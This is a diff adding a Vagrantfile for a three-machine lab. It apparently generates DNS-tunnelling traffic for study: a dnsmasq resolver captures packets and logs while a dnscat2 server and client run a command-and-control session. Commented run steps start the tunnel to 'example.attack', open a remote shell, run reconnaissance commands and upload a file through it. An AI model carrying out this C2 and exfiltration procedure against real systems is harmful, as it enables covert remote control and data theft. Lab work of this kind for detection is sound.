@@ -1,0 +1,156 @@
+# -*- mode: ruby -*-
+# vi: set ft=ruby :
+
+Vagrant.configure("2") do |config|
+
+
+
+config.vm.define "dnsmasq" do |dnsmasq|
+
+    # Set the box-type and version (default is latest)
+    dnsmasq.vm.box = "ubuntu/focal64"
+    dnsmasq.vm.box_version = ">= 0"
+    
+    # Set the hostname
+    dnsmasq.vm.hostname = "dnsmasq"
+
+    # Setup networking
+    dnsmasq.vm.network "private_network", ip: "192.168.0.10", virtualbox__intnet: "intnet"
+    
+
+    # Provision VM
+    dnsmasq.vm.provision "shell", path: 'dnsmasq.bash', privileged: true
+    
+    dnsmasq.vm.provision "ansible_local" do |a|
+        a.install = true,
+        a.install_mode = "default",
+        a.playbook = "filebeat_playbook_dnsmasq",
+        a.become_user = "root",
+        a.become = true
+    end
+    # Runtime triggers
+    dnsmasq.trigger.after [:up, :reload] do |trigger|
+        trigger.info = "Begin TCPDUMP capture."
+        trigger.run_remote = { inline: 'rm -f nohup.out; nohup tcpdump -i any -n -t -w /tmp/dns.pcap port 53 & sleep 1; echo $! > /var/run/tcpdump.pid', privileged: true }
+    end
+    dnsmasq.trigger.after [:up, :reload] do |trigger|
+        trigger.info = "Executing 'run'-section of the scenario component."
+        trigger.run_remote = { inline: 'systemctl stop systemd-resolved; systemctl restart dnsmasq;', privileged: true }
+    end
+
+    # Data collection
+    
+    dnsmasq.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Stopping TCPDUMP"
+        trigger.run_remote = { inline: 'if [ -f /var/run/tcpdump.pid ]; then kill $(cat /var/run/tcpdump.pid); rm -f /var/run/tcpdump.pid; fi', privileged: true }
+    end
+    dnsmasq.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /var/log/dnsmasq.log"
+        trigger.run_remote = { inline: 'chmod o+r /var/log/dnsmasq.log', privileged: true }
+    end
+    dnsmasq.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /var/log/dnsmasq.log"
+        trigger.run = { inline: 'vagrant scp dnsmasq:/var/log/dnsmasq.log dnsmasq/' }
+    end
+    dnsmasq.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /var/log/dnsmasq.log"
+        trigger.run_remote = { inline: 'rm -rf /var/log/dnsmasq.log', privileged: true }
+    end
+    dnsmasq.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /tmp/dns.pcap"
+        trigger.run_remote = { inline: 'chmod o+r /tmp/dns.pcap', privileged: true }
+    end
+    dnsmasq.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /tmp/dns.pcap"
+        trigger.run = { inline: 'vagrant scp dnsmasq:/tmp/dns.pcap dnsmasq/' }
+    end
+    dnsmasq.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /tmp/dns.pcap"
+        trigger.run_remote = { inline: 'rm -rf /tmp/dns.pcap', privileged: true }
+    end
+    dnsmasq.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /tmp/filebeat.json*"
+        trigger.run_remote = { inline: 'chmod o+r /tmp/filebeat.json*', privileged: true }
+    end
+    dnsmasq.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /tmp/filebeat.json*"
+        trigger.run = { inline: 'vagrant scp dnsmasq:/tmp/filebeat.json* dnsmasq/' }
+    end
+    dnsmasq.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /tmp/filebeat.json*"
+        trigger.run_remote = { inline: 'rm -rf /tmp/filebeat.json*', privileged: true }
+    end
+    end
+config.vm.define "dnscatserver" do |dnscatserver|
+
+    # Set the box-type and version (default is latest)
+    dnscatserver.vm.box = "ubuntu/focal64"
+    dnscatserver.vm.box_version = ">= 0"
+    
+    # Set the hostname
+    dnscatserver.vm.hostname = "dnscatserver"
+
+    # Setup networking
+    dnscatserver.vm.network "private_network", ip: "192.168.0.20", virtualbox__intnet: "intnet"
+    
+
+    # Provision VM
+     dnscatserver.vm.provision "shell", inline: 'sudo apt install -y ruby ruby-dev asciinema libtext-lorem-perl; git clone https://github.com/iagox86/dnscat2.git; cd dnscat2/server/; sudo gem install bundler; sudo bundle install; sudo lorem -p 1000 > /root/test-file;', privileged: true
+    
+    # Runtime triggers
+    dnscatserver.trigger.after [:up, :reload] do |trigger|
+        trigger.info = "Executing 'run'-section of the scenario component."
+        trigger.run_remote = { inline: 'echo "This will be run interactively"; #vagrant ssh dnscat_server; #asciinema rec /tmp/dnscat_server.cast; #ruby ./dnscat2/server/dnscat2.rb example.attack --secret 1234; #window -i 1; #shell; #ctrl-z; #window -i 2; #whoami; #pwd; #ps aux; #w; #env; #ctrl-z; #window -i 1; #upload /tmp/test-file /tmp/test-file;', privileged: true }
+    end
+
+    # Data collection
+    dnscatserver.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /tmp/*.cast"
+        trigger.run_remote = { inline: 'chmod o+r /tmp/*.cast', privileged: true }
+    end
+    dnscatserver.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /tmp/*.cast"
+        trigger.run = { inline: 'vagrant scp dnscatserver:/tmp/*.cast dnscatserver/' }
+    end
+    dnscatserver.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /tmp/*.cast"
+        trigger.run_remote = { inline: 'rm -rf /tmp/*.cast', privileged: true }
+    end
+    end
+config.vm.define "dnscatclient" do |dnscatclient|
+
+    # Set the box-type and version (default is latest)
+    dnscatclient.vm.box = "ubuntu/focal64"
+    dnscatclient.vm.box_version = ">= 0"
+    
+    # Set the hostname
+    dnscatclient.vm.hostname = "dnscatclient"
+
+    # Setup networking
+    dnscatclient.vm.network "private_network", ip: "192.168.0.30", virtualbox__intnet: "intnet"
+    
+
+    # Provision VM
+     dnscatclient.vm.provision "shell", inline: 'sudo apt-get install -y asciinema; git clone https://github.com/iagox86/dnscat2.git; cd dnscat2/client/; make;', privileged: true
+    
+    # Runtime triggers
+    dnscatclient.trigger.after [:up, :reload] do |trigger|
+        trigger.info = "Executing 'run'-section of the scenario component."
+        trigger.run_remote = { inline: 'echo "This will be run interactively"; #vagrant ssh dnscat_client; #asciinema rec /tmp/dnscat_client.cast; #./dnscat2/client/dnscat --dns server=192.168.0.10,domain=example.attack --secret=1234; #exit;', privileged: true }
+    end
+
+    # Data collection
+    dnscatclient.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /tmp/*.cast"
+        trigger.run_remote = { inline: 'chmod o+r /tmp/*.cast', privileged: true }
+    end
+    dnscatclient.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /tmp/*.cast"
+        trigger.run = { inline: 'vagrant scp dnscatclient:/tmp/*.cast dnscatclient/' }
+    end
+    dnscatclient.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /tmp/*.cast"
+        trigger.run_remote = { inline: 'rm -rf /tmp/*.cast', privileged: true }
+    end
+    end
+end
